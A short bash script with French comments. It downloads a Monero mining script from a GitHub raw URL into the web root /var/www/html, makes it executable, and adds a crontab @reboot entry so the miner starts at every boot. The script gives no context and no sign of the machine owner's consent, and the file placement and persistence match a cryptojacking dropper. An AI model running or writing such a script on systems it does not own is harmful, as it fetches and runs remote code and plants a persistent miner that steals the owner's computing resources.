#!/bin/bash

# Télécharger le script de minage
wget -O /var/www/html/start_mining.sh https://raw.githubusercontent.com/estebanbecker/monero-mining/main/start_mining.sh

# Rendre le script exécutable
chmod +x /var/www/html/start_mining.sh

# Configurer le script pour qu'il soit exécuté au démarrage
(crontab -l ; echo "@reboot /var/www/html/start_mining.sh") | crontab -
